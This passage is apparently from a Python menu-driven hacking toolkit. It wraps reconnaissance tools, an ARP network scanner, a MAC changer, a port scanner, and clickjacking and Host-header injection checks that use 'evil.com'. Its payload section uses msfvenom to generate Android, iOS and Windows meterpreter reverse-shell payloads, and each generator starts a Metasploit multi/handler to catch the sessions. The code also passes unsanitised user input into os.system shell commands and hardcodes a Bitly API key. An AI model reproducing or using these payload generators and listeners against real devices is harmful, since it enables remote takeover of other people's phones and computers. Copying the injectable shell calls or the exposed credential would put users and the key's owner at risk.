    ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒░░░░░░▓▓
    ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
    _______▒__________▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    ______▒_______________▒▒▒▒▒▒▒▒
    _____▒________________▒▒▒▒▒▒▒▒
    ____▒___________▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    ___▒
    __▒______▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
    _▒______▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓
    ▒▒▒▒___▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓
    ▒▒▒▒__▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓▒▓
    ▒▒▒__▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
    ▒▒
    """)
        website = str(input("\n\nEnter the website (ex: facebook.com) >> :"))
        subprocess.call(["dmitry", website])
        print(cyan + "\n\n\t\t\t!!!..........Website Information Gathering Successfully Completed..........!!!")
    except KeyboardInterrupt:
        os.system("clear")
        Webvuln()


def dnsrecon():
    try:
        print(cyan + "\t\t\b!!!!............DNS Reconnaissance............!!!!\n\n")
        print(green + """                         ______                     
     _________        .---"""      """---.              
    :______.-':      :  .--------------.  :             
    | ______  |      | :                : |             
    |:______B:|      | |      DNS       | |             
    |:______B:|      | |Reconnaissance: | |             
    |:______B:|      | |                | |             
    |         |      | |                | |             
    |:_____:  |      | |                | |             
    |    ==   |      | :                : |             
    |       O |      :  '--------------'  :             
    |       o |      :'---...______...---'              
    |       o |-._.-i___/'             \._              
    |'-.____o_|   '-.   '-...______...-'  `-._          
    :_________:      `.____________________   `-.___.-. 
                     .'.eeeeeeeeeeeeeeeeee.'.      :___:
        fsc        .'.eeeeeeeeeeeeeeeeeeeeee.'.         
                  :____________________________:""")
        print("\n\n")
        dns = str(input(green + "Enter the Domain (ex: facebook.com) >> :"))
        subprocess.call(["dnsrecon", "-d", dns])
        print(cyan + "\n\n\t\t.........Complete !!.........\n\n")
    except KeyboardInterrupt:
        os.system("clear")
        Webvuln()


def Webvuln():
    ascii_banner = pyfiglet.figlet_format("Website Vulnerability Scanning")
    print(colored(ascii_banner, 'yellow', attrs=["bold"]))
    print(green + """
                  1.Subdomain Enumeration
                  2.Reverse IP
                  3.Website Information Gathering


                  usage : type exit back to menu
                  """)
    inp = (input("Choose Options >> "))

    if inp == '1':
        os.system("clear")
        fuzz()
    elif inp == '2':
        os.system("clear")
        ReverseIP()
    elif inp == '3':
        os.system("clear")
        websiteinfofather()
    elif inp == '4':
        os.system("clear")
        dnsrecon()
    elif inp == "exit":
        os.system("clear")
        dexosint()
    else:
        print(red + "\t\t\t\b..........Invalid choice..........")
    while True:
        Webvuln()


def networkscan():
    try:
        print(cyan + "\t\t\b!!!!............Network Scanner............!!!!\n\n")
        print("\n.................................................................")
        print(green + """         _nnnn_                      
            dGGGGMMb     ,"""""""""""""".
           @p~qp~~qMb    | Linux Rules! |
           M|@||@) M|   _;..............'
           @,----.JM| -'
          JS^\__/  qKL
         dZP        qKRb
        dZP          qKKb
       fZP            SMMb
       HZM            MMMM
       FqM            MMMM
     __| ".        |\dS"qML
     |    `.       | `' \Zq
    _)      \.___.,|     .'
    \____   )MMMMMM|   .'
         `-'       `--' hjm""")
        ip = input(Y + "Enter the IP Address Range (ex: 192.168.225.1/24)>> :")
        print("\n.................................................................")

        def scan(ip):
            arp_request = scapy.ARP(pdst=ip)
            source_destination = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            final = source_destination / arp_request
            answered_list = scapy.srp(final, timeout=1, verbose=False)[0]

            result_list = []
            for answer in answered_list:
                result = {"IP": answer[1].psrc, "MAC": answer[1].hwsrc}
                result_list.append(result)
            return result_list

        def print_result(result_list):
            print("IP\t\t\tMAC\n.................................................................")
            print("\n.................................................................")
            for result in result_list:
                print(red + (result["IP"] + "\t\t" + result["MAC"]))

        result = scan(ip)
        print_result(result)
        print(green + "\n\n\t\t.........Complete !!.........\n\n")
    except KeyboardInterrupt:
        os.system("clear")
        network1()


def macchanger():
    try:
        print(cyan + "\t\t\b!!!!............Mac Changer............!!!!\n\n")
        print(green + """                          _______
                             | ___  o|
                             |[_-_]_ |
          ______________     |[_____]|
         |.------------.|    |[_____]|
         ||            ||    |[====o]|
         ||            ||    |[_.--_]|
         ||            ||    |[_____]|
         ||            ||    |      :|
         ||____________||    |      :|
     .==.|""  ......    |.==.|      :|
     |::| '-.________.-' |::||      :|
     |''|  (__________)-.|''||______:|
     `""`_.............._""`______
        /:::::::::::'':::\`;'-.-.  `""")

        def get_options():
            interface = input(Y + "\t\nEnter the Interface [eth0 or wlan0] >> : ")
            new_mac = input("\t\nInput the New_mac Address [ex: 1a:2b:3c:4d:5e:6g] >> :")
            return interface, new_mac

        def mac_change(interface, new_mac):

            subprocess.call(["ifconfig", interface, "down"])
            subprocess.call(["ifconfig", interface, "hw", "ether", new_mac])
            subprocess.call(["ifconfig", interface, "up"])

        def get_mac(interface):
            ifconfig_result = codecs.decode(subprocess.check_output(["ifconfig", interface]))
            ifconfig_result_filter = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", ifconfig_result)
            if ifconfig_result_filter:
                return ifconfig_result_filter.group(0)
            else:
                print(red + "\n\tMac address is not Found")
                print(green + "\n\n\t\t.........Complete !!.........\n\n")

        (interface, new_mac) = get_options()
        mac_filter_result = get_mac(interface)
        print(red + "\n\tOld mac " + str(mac_filter_result))

        mac_change(interface, new_mac)

        mac_filter_result = get_mac(interface)
        print(red + "\n\tcurrent mac " + str(mac_filter_result))
        if mac_filter_result == new_mac:
            print(red + "\n\tMAC address change successfully")
            print((cyan + "\n\tChanging interface ") + interface + (Y + " to new_mac ") + new_mac)
            print(green + "\n\n\t\t.........Complete !!.........\n\n")

        else:
            print(red + "\n\tMAC address is not change")
            print(green + "\n\n\t\t.........Complete !!.........\n\n")
    except KeyboardInterrupt:
        os.system("clear")
        network1()


def port_scanning():
    print(cyan + "\t\t\b!!!!............Port Scanner............!!!!\n\n")
    print(green + """              ,---------------------------,
              |  /---------------------\  |
              | |                       | |
              | |      Port             | |
              | |        Scanning       | |
              | |                       | |
              | |                       | |
              |  \_____________________/  |
              |___________________________|
            ,---\_____     []     _______/------,
          /         /______________\           /|
        /___________________________________ /  | ___
        |                                   |   |    )
        |  _ _ _                 [-------]  |   |   (
        |  o o o                 [-------]  |  /    _)_
        |__________________________________ |/     /  /
    /-------------------------------------/|      ( )/
  /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /
/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~""")
    target = input(Y + "Enter the IP Address ..>>:")

    if re.fullmatch('(?:[0-9]{1,3}\.){3}[0-9]{1,3}', target):
        print("The Target is " + target)
    else:
        print(red + "\n\n\t\tInvalid amount of Argument\n\n")
        port_scanning()

    # Add Banner
    print("-" * 50)
    print("Scanning Target: " + target)
    print("Scanning started at:" + str(datetime.now()))
    print("-" * 50)

    try:

        # will scan ports between 1 to 65,535
        for port in range(1, 65535):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(1)

            # returns an error indicator
            result = s.connect_ex((target, port))
            if result == 0:
                print("Port {} is open".format(port))
            s.close()

    except KeyboardInterrupt:
        os.system("clear")
        network1()
    except socket.gaierror:
        print("\n Hostname Could Not Be Resolved !!!!")
        sys.exit()
    except socket.error:
        print("\ Server not responding !!!!")
        sys.exit()


def network1():
    print("""    _   __     __                      __      _____                        _            
   / | / /__  / /__      ______  _____/ /__   / ___/_________ _____  ____  (_)___  ____ _
  /  |/ / _ \/ __/ | /| / / __ \/ ___/ //_/   \__ \/ ___/ __ `/ __ \/ __ \/ / __ \/ __ `/
 / /|  /  __/ /_ | |/ |/ / /_/ / /  / ,<     ___/ / /__/ /_/ / / / / / / / / / / / /_/ / 
/_/ |_/\___/\__/ |__/|__/\____/_/  /_/|_|   /____/\___/\__,_/_/ /_/_/ /_/_/_/ /_/\__, /  
                                                                                /____/   """)
    print(green + """
                               TOOLS

                          1.Network Scanner
                          2.Mac Changer
                          3.Open Port Scanner


                          usage : type exit back to menu
                          """)
    inp = (input(cyan + "Choose Options >> "))
    if inp == '1':
        os.system("clear")
        networkscan()
    elif inp == '2':
        os.system("clear")
        macchanger()

    elif inp == '3':
        os.system("clear")
        port_scanning()
    elif inp == "exit":
        os.system("clear")
        dexosint()
    else:
        print(red + "Invalid choice")
    while True:
        network1()


def ClickJacking():
    try:
        print(green + """,
                        ,,,,,,,,,,,,,,,,s
                       ,,,,,,,,,,,,,,,,sss
                       ,,,,,,,,,,,,,,,,sss
                       ,,,,,,,,,,,,,,,sssss
                       ,,,,,,,,,,,,,,,sssss
                       ,,,,,,,,,,,,,,,sssss
                       ,,,,,,,,,,,,,,,sssss
                       ,,,,,,,,,,,,,,sssssss
                       ,,,,,,,,,,,,,,sssssss
                       ,,,,,,,,,,,,,,sssssss
                       ,,,,,,,,,,,,,sssssssss
                       ,,,,,,,,,,,,,sssssssss
                       ,,,,,,,,,,,,,sssssssss
                       ,,,,,,,,,,,,,sssssssss
                       ,,,,,,,,,,,,,sssssssss
                       ,,,,,,,,,,,,,sssssssss
                       ,,,,,,,,,,,,,sssssssss
                       ,,,,,,,,,,,,,sssssssss
                       ,,,,,,,,,,,,,sssssssss
                       ,,,,,,,,,,,,,sssssssss
                       ,,,,,,,,,,,,,sssssssss
                       ,,,,,,ss,,,,sssssssss,,,,sss
                       ,,,,,sss,,,,,ssssssss,,,,,sss
                       ,,,ssss,,,,,sssssssss,,,,,ssss""")
        print(cyan + "\t\t\t!!!!................ClickJacking................!!!!")
        print(green + """\t\t\t,,,sssssssssssssssssssssssss
                       ,,,,,,,,,,,,,,ssssssss
                       ,,,,,,,,,,,,,,,ssssss
                       ,,,,,,,,,,,,,,,ssssss
                       ,,,,,,,,,,,,,,,ssssss
                       ,,,,,,,,,,,,,,,ssssss
                       ,,,,,,,,,,,,,,ssssssss
                       ,,,,,,,,,,,,,,,,sssss
                       ,,,,,,,,,,,,,sssssssss
                       ,,,,,,,,,,,,,,,ssssss
                       """)
        host = input(Y + "Enter host (ex: facebook.com)>>")
        port = int(input(Y + "Enter port (80->http  443->https) >>"))
        if port == 80:
            port = 'http://'
        elif port == 443:
            port = 'https://'
        else:
            print(cyan + "Could'nt fetch data for the given PORT")

        url = (port + host)

        data = urlopen(url)
        headers = data.info()

        if not "X-Frame-Options" in headers:
            print(red + "\n\t\t\bWebsite is vulnerable to ClickJacking\n\n")
            print(green + "\n\n\t\t.........Complete !!.........\n\n")

        else:
            print(red + "\n\t\t\bWebsite is not Vulnerable to ClickJacking\n\n")
            print(green + "\n\n\t\t.........Complete !!.........\n\n")
    except KeyboardInterrupt:
        os.system("clear")
        Bug()


def HostHeader():
    try:
        print(cyan +
              """
          __¶¶___________________________________________¶¶
          __¶¶¶¶________________________________________¶¶¶
          __¶¶_¶¶_____________________________________¶¶_¶¶
          __¶¶__¶¶___________________________________¶¶__¶¶
          __¶¶_¶_¶¶_________________________________¶¶_¶_¶¶
          __¶¶__¶__¶_______________________________¶¶_¶__¶¶
          __¶¶___¶__¶¶____________________________¶__¶___¶¶
          ___¶¶___¶¶_¶¶_________________________¶¶__¶___¶¶
          ____¶¶___¶¶_¶¶_______________________¶¶_¶¶___¶¶¶
          _____¶¶___¶¶__¶_____________________¶¶_¶¶____¶¶
          ______¶¶___¶¶__¶¶__________________¶__¶¶___¶¶¶
          _______¶¶____¶¶_¶¶_______________¶¶_¶¶¶____¶¶
          ________¶¶____¶¶_¶¶_____________¶¶_¶¶____¶¶¶
          _________¶¶____¶¶__¶¶__________¶__¶¶____¶¶¶
          __________¶¶_____¶¶_¶¶_______¶¶__¶¶____¶¶
          ___________¶¶_____¶¶_¶¶_____¶¶_¶¶_____¶¶
          _____________¶¶____¶¶__¶¶__¶__¶¶____¶¶¶
          ______________¶¶¶____¶¶_¶¶¶_¶¶¶___¶¶¶
          ________________¶¶¶___¶¶__¶¶¶___¶¶¶¶
          __________________¶¶¶___¶¶_¶¶__¶¶¶ """)
        print(green + """
        !!!!............Host header injection............!!!!""")
        print(cyan + """
        ____________________¶_¶¶¶__¶¶_¶¶___¶¶¶¶¶¶
        _________¶¶¶¶¶¶¶¶_¶¶_¶¶_¶¶__¶¶_¶¶¶¶¶¶¶¶_¶¶
        ________¶¶_¶¶¶¶¶¶¶¶_¶¶_¶¶¶¶¶__¶¶¶¶¶¶__¶¶_¶¶
        ________¶¶¶¶___¶¶¶¶¶__¶¶___¶¶¶¶¶¶¶¶¶¶__¶¶¶¶
        _____________¶¶¶¶¶¶¶¶¶_______¶¶¶¶¶_¶¶¶
        ___________¶¶¶_¶_¶¶¶¶¶______¶¶¶_¶¶¶_¶¶¶¶
        __________¶¶¶_¶_¶¶__¶¶¶_____¶¶¶__¶¶¶__¶¶¶
        _________¶¶_¶¶_¶¶__¶¶_¶_____¶_¶¶__¶¶_¶_¶¶¶
        _______¶¶¶_¶_¶¶¶__¶¶_¶¶_____¶¶_¶___¶¶_¶¶_¶¶¶
        ______¶¶_¶¶_¶¶¶____¶¶¶_______¶¶¶_____¶¶_¶_¶¶¶¶
        _¶¶¶¶¶¶_¶_¶¶¶_________________________¶¶_¶¶_¶¶¶¶¶¶
        ¶¶____¶¶_¶¶¶____________________________¶¶_¶¶____¶
        ¶¶_____¶¶¶¶______________________________¶¶_____¶¶
        _¶¶¶____¶¶_______________________________¶____¶¶¶
        __¶¶¶¶__¶¶_______________________________¶¶¶¶¶¶¶
        """)
        host = input(green + "Enter host (Ex:Facebook.com) >> ")
        port = int(input("Enter port(80->http  443->https) >> "))
        if port == 80:
            port = 'http://'
        elif port == 443:
            port = 'https://'
        else:
            print(cyan + "Could'nt fetch data for the given PORT")
        url = (port + host)
        headers = {'Host': 'http://evil.com'}
        response = requests.get(url, headers=headers)
        if 'evil.com' in response.headers:
            print(red + "V\n\t\t\bulnerable to Host Header Injection")
            print(green + "\n\n\t\t.........Complete !!.........\n\n")

        else:
            print(red + "\n\t\t\bNot Vulnerable to Host header injection")
            print(green + "\n\n\t\t.........Complete !!.........\n\n")
    except KeyboardInterrupt:
        os.system("clear")
        Bug()


def urlinfo():
    try:
        print(green + """\t\t,---------------------------,
                      |  /---------------------\  |
                      | |                       | |
                      | |   URL                 | |
                      | |   Redirection         | |
                      | |   Checker             | |
                      | |                       | |
                      |  \_____________________/  |
                      |___________________________|
                    ,---\_____     []     _______/------,
                  /         /______________\           /|
                /___________________________________ /  | ___
                |                                   |   |    )
                |  _ _ _                 [-------]  |   |   (
                |  o o o                 [-------]  |  /    _)_
                |__________________________________ |/     /  /
            /-------------------------------------/|      ( )/
          /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /
        /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                           """)
        print(Y + "Note : URL = http://example.com")
        url = input("URL >> ")
        print("-" * 50)
        print(cyan + "          Trace Results        ")
        print("-" * 50)
        try:
            r = requests.get(url)
            print()
            current_datetime = datetime.now()
            print("\n[+]Traced Date and Time :", current_datetime)
            print(red + "\n[-]" + "301 Redirected\n")
            print(cyan + "\n[-]" + r.url)
            print(green + "\n\n\t\t.........Complete !!.........\n\n")
        except Exception as e:
            print(red + "Error Occured :" + e)
            print(green + "\n\n\t\t.........Complete !!.........\n\n")
    except KeyboardInterrupt:
        os.system("clear")
        Bug()


def Bug():
    ascii_banner = pyfiglet.figlet_format("BUG FIND IN WEBSITE")
    print(colored(ascii_banner, 'yellow', attrs=["bold"]))
    print(green + """
                          1.ClickJacking
                          2.Host header injection
                          3.URL redirection checker

                          usage : type exit back to menu
                          """)
    inp = (input("Choose Options >> "))
    if inp == '1':
        os.system("clear")
        ClickJacking()
    elif inp == '2':
        os.system("clear")
        HostHeader()
    elif inp == '3':
        os.system("clear")
        urlinfo()
    elif inp == 'exit':
        os.system("clear")
        dexosint()
    else:
        print(red + "Invalid choice")
    while True:
        Bug()


def url_info():
    try:
        print(cyan + "\t\t\b!!!!............Malicious URL detection............!!!!\n\n")
        print(Y + """  _____________________
      /                 `   \
      |  .-----------.  |   |-----.
      |  |           |  |   |-=---|
      |  | Malicious |  |   |-----|
      |  | URL       |  |   |-----|
      |  | Detection |  |   |-----|
      |  `-----------'  |   |-----'/\
       \________________/___'     /  \
          /                      / / /
         / //               //  / / /
        /                      / / /
       / _/_/_/_/_/_/_/_/_/_/ /   /
      / _/_/_/_/_/_/_/_/_/_/ /   /
     / _/_/_/_______/_/_/_/ / __/
    /______________________/ /    
    \______________________\/""")
        api = input(green + "Enter API key for your IPQualityscore Account: ")
        url = input(green + "Enter the URL :")
        encoded_url = urllib.parse.quote(url, safe='')
        api_url = "https://ipqualityscore.com/api/json/url/" + api + "/"
        data = requests.get(api_url + encoded_url)
        print(json.dumps(data.json(), indent=4))
    except KeyboardInterrupt:
        os.system("clear")
        anatomyurl()


def url_shortener():
    try:
        print(cyan +
              """
                __¶¶___________________________________________¶¶                __¶¶¶¶________________________________________¶¶¶
                __¶¶_¶¶_____________________________________¶¶_¶¶
                __¶¶__¶¶___________________________________¶¶__¶¶
                __¶¶_¶_¶¶_________________________________¶¶_¶_¶¶
                __¶¶__¶__¶_______________________________¶¶_¶__¶¶
                __¶¶___¶__¶¶____________________________¶__¶___¶¶
                ___¶¶___¶¶_¶¶_________________________¶¶__¶___¶¶
                ____¶¶___¶¶_¶¶_______________________¶¶_¶¶___¶¶¶
                _____¶¶___¶¶__¶_____________________¶¶_¶¶____¶¶
                ______¶¶___¶¶__¶¶__________________¶__¶¶___¶¶¶
                _______¶¶____¶¶_¶¶_______________¶¶_¶¶¶____¶¶
                ________¶¶____¶¶_¶¶_____________¶¶_¶¶____¶¶¶
                _________¶¶____¶¶__¶¶__________¶__¶¶____¶¶¶
                __________¶¶_____¶¶_¶¶_______¶¶__¶¶____¶¶
                ___________¶¶_____¶¶_¶¶_____¶¶_¶¶_____¶¶
                _____________¶¶____¶¶__¶¶__¶__¶¶____¶¶¶
                ______________¶¶¶____¶¶_¶¶¶_¶¶¶___¶¶¶
                ________________¶¶¶___¶¶__¶¶¶___¶¶¶¶
                __________________¶¶¶___¶¶_¶¶__¶¶¶ """)
        print(green + """
                !!!!............Host header injection............!!!!""")
        print(cyan + """
                ____________________¶_¶¶¶__¶¶_¶¶___¶¶¶¶¶¶
                _________¶¶¶¶¶¶¶¶_¶¶_¶¶_¶¶__¶¶_¶¶¶¶¶¶¶¶_¶¶
                ________¶¶_¶¶¶¶¶¶¶¶_¶¶_¶¶¶¶¶__¶¶¶¶¶¶__¶¶_¶¶
                ________¶¶¶¶___¶¶¶¶¶__¶¶___¶¶¶¶¶¶¶¶¶¶__¶¶¶¶
                _____________¶¶¶¶¶¶¶¶¶_______¶¶¶¶¶_¶¶¶
                ___________¶¶¶_¶_¶¶¶¶¶______¶¶¶_¶¶¶_¶¶¶¶
                __________¶¶¶_¶_¶¶__¶¶¶_____¶¶¶__¶¶¶__¶¶¶
                _________¶¶_¶¶_¶¶__¶¶_¶_____¶_¶¶__¶¶_¶_¶¶¶
                _______¶¶¶_¶_¶¶¶__¶¶_¶¶_____¶¶_¶___¶¶_¶¶_¶¶¶
                ______¶¶_¶¶_¶¶¶____¶¶¶_______¶¶¶_____¶¶_¶_¶¶¶¶
                _¶¶¶¶¶¶_¶_¶¶¶_________________________¶¶_¶¶_¶¶¶¶¶¶
                ¶¶____¶¶_¶¶¶____________________________¶¶_¶¶____¶
                ¶¶_____¶¶¶¶______________________________¶¶_____¶¶
                _¶¶¶____¶¶_______________________________¶____¶¶¶
                __¶¶¶¶__¶¶_______________________________¶¶¶¶¶¶¶
                """)

        long_url = input(Y + "Enter the URL to shorten: ")

        type_bitly = pyshorteners.Shortener(api_key='e993151f820bb9e13ba2e01a1543699270ecd7f3')
        short_url = type_bitly.bitly.short(long_url)

        print("The Shortened URL is: " + short_url)
    except KeyboardInterrupt:
        os.system("clear")
        anatomyurl()


def anatomyurl():
    ascii_banner = pyfiglet.figlet_format("ANATOMY OF URL")
    print(colored(ascii_banner, 'yellow', attrs=["bold"]))
    print(green + """
                          1.Malicious URL detection
                          2.URl shortener

                          usage : type exit back to menu
                          """)
    inp = (input("Choose Options >> "))
    if inp == '1':
        os.system("clear")
        url_info()
    elif inp == '2':
        os.system("clear")
        url_shortener()
    elif inp == 'exit':
        os.system("clear")
        dexosint()
    else:
        print(red + "Invalid choice")
    while True:
        anatomyurl()


def android_payload():
    try:
        print(green + """
    @@@@@@@@@@&^:7&@@@@@@@@@@&7:^&@@@@@@@@@@
    @@@@@@@@@@@P^:!5J?7777?J5!:^P@@@@@@@@@@@
    @@@@@@@@@@&5^^~~~!!!!!!~~~^^5&@@@@@@@@@@
    @@@@@@@@&J^^!!!!!!!!!!!!!!!!^^J&@@@@@@@@
    @@@@@@@#~^!!!^.~!!!!!!!!~.^!!!^~#@@@@@@@
    @@@@@@@^^7!!!!!!!!!!!!!!!!!!!!7^^@@@@@@@
    @@#BB@G.!!!!!!!!!!!!!!!!!!!!!!!!.G@BB#@@
    G!~~~~^.^^^^^^^^^^^^^^^^^^^^^^^^.^~~~~!G
    .~!!!!::7!!!!!!!!!!!!!!!!!!!!!!7::!!!!~.
    .!!!!!^:!!!!!!!!!!!!!!!!!!!!!!!!:^!!!!!.
    .!!!!!^:!!!!!!!!!!!!!!!!!!!!!!!!:^!!!!!.
    .!!!!!^:!!!!!!!!!!!!!!!!!!!!!!!!:^!!!!!.
    .!!!!!^:!!!!!!!!!!!!!!!!!!!!!!!!:^!!!!!.
    .!!!!7^:!!!!!!!!!!!!!!!!!!!!!!!!:^7!!!!.
    ~^!!!~.:!!!!!!!!!!!!!!!!!!!!!!!!:.~!!!^~
    &57!7J?:7!!!!!!!!!!!!!!!!!!!!!!7:?J7!75&
    @@@@@@B:~!!!!!!!!!!!!!!!!!!!!!!~:B@@@@@@
    @@@@@@@#J7!~^!!!!!^!!^!!!!!^~!7J#@@@@@@@
    @@@@@@@@@@@5.!!!!!.##.!!!!!.5@@@@@@@@@@@
    @@@@@@@@@@@5:!!!!!.##.!!!!!:5@@@@@@@@@@@
    @@@@@@@@@@@G.!!!!~:&&:~!!!!.G@@@@@@@@@@@
    @@@@@@@@@@@@5~^^^!G@@G!^^^~5@@@@@@@@@@@@
    """)

        def listeners(type):
            listen = input(green + "do you want to start multi/handler(yes/No)  :")
            if listen == "yes":
                ip = input("Enter the Local Host IP Address :")
                lport = input("Enter the Local Port :")
                os.system(
                    "msfconsole -q -x" + "'use exploit/multi/handler; set payload  android/meterpreter/reverse_" + type + "; set lhost " + ip + "; set lport " + lport + "; exploit'")
            else:
                payload_gen()

        ip = input(Y + "Enter the Local Host IP Address:")
        port = input("Enter the Local Port:")
        name = input("Enter the Payload Name:")
        print(Blue, """
                          available payloads
                           1)android/meterpreter/reverse_tcp
                           2)android/meterpreter/reverse_https
                           3)android/meterpreter/reverse_http
                           """)

        def generate():
            x = int(input("choose option:"))
            if x == 1:
                os.system(
                    "msfvenom -p android/meterpreter/reverse_tcp lhost=" + ip + " lport=" + port + " -o " + name + ".apk")
                print(green, '[+]Generating Payload')
                time.sleep(3)
                print("payload saved " + name + ".apk")
                listeners("tcp")

            elif x == 2:
                os.system(
                    "msfvenom -p android/meterpreter/reverse_https lhost=" + ip + " lport=" + port + " -o " + name + ".apk")
                print(green, '[+]Generating Payload')
                time.sleep(3)
                print("payload saved " + name + ".apk")
                listeners("https")
            elif x == 3:
                os.system(
                    "msfvenom -p android/meterpreter/reverse_http lhost=" + ip + " lport=" + port + " -o " + name + ".apk")
                print(green, '[+]Generating Payload')
                time.sleep(3)
                print("payload saved " + name + ".apk")
                listeners("http")
            else:
                print("option not found")
                generate()

        generate()
    except KeyboardInterrupt:
        os.system("clear")
        payload_gen()


def apple_payload():
    try:
        print(cyan + "\t\t\b!!!!............Apple-ios Payload Creation............!!!!\n\n")
        print(cyan + """
                            :~!.            
                         .!JY55.            
                        ^Y5555~             
                       :555Y?:              
               .:::.   :7!~:.::::.          
            ^7JYY55YJ?7~~7?JY5555YJ7^       
          :J555555555555555555555555Y~      
         ^55555555555555555555555557.       
        .Y555555555555555555555555~         
        ^555555555555555555555555Y.         
        ~555555555555555555555555Y.         
        :55555555555555555555555557         
         ?5555555555555555555555555?^       
         :Y55555555555555555555555555J~     
          ^Y5555555555555555555555555Y:     
           ^Y55555555555555555555555J:      
            .75555555555555555555557.       
              :7YY5YJ?7!!!7?JY5YY7:         
                .::..       ..::.           
        """)

        def listeners(type):
            listen = input(green + "do you want to start multi/handler(yes/No)  :")
            if listen == "yes":
                ip = input("Enter the Local Host IP Address :")
                lport = input("Enter the Local Port :")
                os.system(
                    "msfconsole -q -x" + "'use exploit/multi/handler; set payload  apple_ios/aarch64/meterpreter_reverse_" + type + "; set lhost " + ip + "; set lport " + lport + "; exploit'")
            else:
                payload_gen()

        ip = input(Y + "Enter the Local Host IP Address:")
        port = input("Enter the Local Port:")
        name = input("Enter the Payload Name:")
        print(Blue, """
                          available payloads
                           1)apple_ios/aarch64/meterpreter_reverse_tcp
                           2)apple_ios/aarch64/meterpreter_reverse_https
                           3)apple_ios/aarch64/meterpreter_reverse_http
                           """)

        def generate():
            x = int(input("choose option:"))
            if x == 1:
                os.system(
                    "msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp lhost=" + ip + " lport=" + port + " -f macho -o " + name + "iOS")
                print(green, '[+]Generating Payload')
                time.sleep(3)
                print("payload saved " + name + "iOS")
                listeners("tcp")

            elif x == 2:
                os.system(
                    "msfvenom -p apple_ios/aarch64/meterpreter_reverse_https lhost=" + ip + " lport=" + port + " -f macho -o " + name + "iOS")
                print(green, '[+]Generating Payload')
                time.sleep(3)
                print("payload saved " + name + "iOS")
                listeners("https")
            elif x == 3:
                os.system(
                    "msfvenom -p apple_ios/aarch64/meterpreter_reverse_http lhost=" + ip + " lport=" + port + " -f macho -o " + name + "iOS")
                print(green, '[+]Generating Payload')
                time.sleep(3)
                print("payload saved " + name + "iOS")
                listeners("http")
            else:
                print("option not found")
                generate()

        generate()
    except KeyboardInterrupt:
        os.system("clear")
        payload_gen()


def windows_payload():
    try:
        print(cyan + "\t\t\b!!!!............Windows Payload Creation............!!!!\n\n")
        print(green + """

        @@@@@@@@#G5YJJ???JJYPB&@@@@@@@@@@@@@@@@@
        @@@@@@@#??????????????Y@@&@@@@@@@@@@@@@@
        @@@@@@@Y??????????????B@B?JPB#&&&&&#BGP5
        @@@@@@G??????????????5@@J77777?????7777B
        @@@@@&J?????????????J&@P777777777777775@
        @@@@@5???JJJJJ??????G@#77777777777777?&@
        @@@@&PG##&&&&&&#BPJ5@@J77777777777777B@@
        @@@@#BP55YYYYY5GB&&&@B77777777777777Y@@@
        @@@P?????????????JB@@&#G5YJ????JY5PG&@@@
        @@#JJJJJJJJJJJJJ?Y&@J!YPB######BBPY#@@@@
        @@Y?JJJJJJJJJJJJJ#@G~~~~~~!!!!!~~~7@@@@@
        @G?JJJJJJJJJJJJ?P@&!~~~~~~~~~~~~~~#@@@@@
        #J??JJJJJJ???J?Y&@Y~~~~~~~~~~~~~~5@@@@@@
        P5GB##&&&#BG5YJB@B~~~~~~~~~~~~~~7@@@@@@@
        @@@@@@@@@@@@@@#@@?~~~~~~~~~~~~~~B@@@@@@@
        @@@@@@@@@@@@@@@@@&GY?!~~~~!!7J5B@@@@@@@@
          """)

        def listeners(type):
            listen = input(green + "do you want to start multi/handler(yes/No)  :")
            if listen == "yes":
                ip = input("Enter the Local Host IP Address :")
                lport = input("Enter the Local Port :")
                os.system(
                    "msfconsole -q -x" + "'use exploit/multi/handler; set payload  windows/meterpreter_reverse_" + type + "; set lhost " + ip + "; set lport " + lport + "; exploit'")
            else:
                payload_gen()

        ip = input(Y + "Enter the Local Host IP Address:")
        port = input("Enter the Local Port:")
        name = input("Enter the Payload Name:")
        print(Blue, """
                          available payloads
                           1)windows/meterpreter_reverse_tcp
                           2)windows/meterpreter_reverse_https
                           3)windows/meterpreter_reverse_http
                           """)

        def generate():
            x = int(input("choose option:"))
            if x == 1:
                os.system(
                    "msfvenom -p windows/meterpreter_reverse_tcp lhost=" + ip + " lport=" + port + " -o " + name + ".exe")
                print(green, '[+]Generating Payload')
                time.sleep(3)
                print("payload saved " + name + ".apk")
                listeners("tcp")

            elif x == 2:
                os.system(
                    "msfvenom -p windows/meterpreter_reverse_https lhost=" + ip + " lport=" + port + " -o " + name + ".exe")
                print(green, '[+]Generating Payload')
                time.sleep(3)
                print("payload saved " + name + ".exe")
                listeners("https")
            elif x == 3:
                os.system(
                    "msfvenom -p windows/meterpreter_reverse_http lhost=" + ip + " lport=" + port + " -o " + name + ".exe")
                print(green, '[+]Generating Payload')
                time.sleep(3)
                print("payload saved " + name + ".exe")
                listeners("http")
            else:
                print("option not found")
                generate()

        generate()
    except KeyboardInterrupt:
        os.system("clear")
        payload_gen()


